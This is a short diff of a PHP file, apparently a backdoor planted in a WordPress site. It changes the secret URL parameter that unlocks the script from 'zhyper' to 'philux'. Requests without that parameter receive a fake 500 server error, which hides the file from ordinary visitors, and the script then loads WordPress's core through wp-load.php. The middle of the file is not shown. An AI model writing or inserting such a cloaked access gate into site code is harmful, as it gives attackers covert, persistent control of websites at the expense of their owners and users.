@@ -1,5 +1,5 @@
 <?php
-if (!isset($_GET['zhyper'])) {
+if (!isset($_GET['philux'])) {
     http_response_code(500);
     header("HTTP/1.1 500 Internal Server Error");
     exit();
@@ -28,4 +28,5 @@ if (file_exists('wp-load.php')) {
 } else {
     exit('Failed to load');
 }
+
 ?>
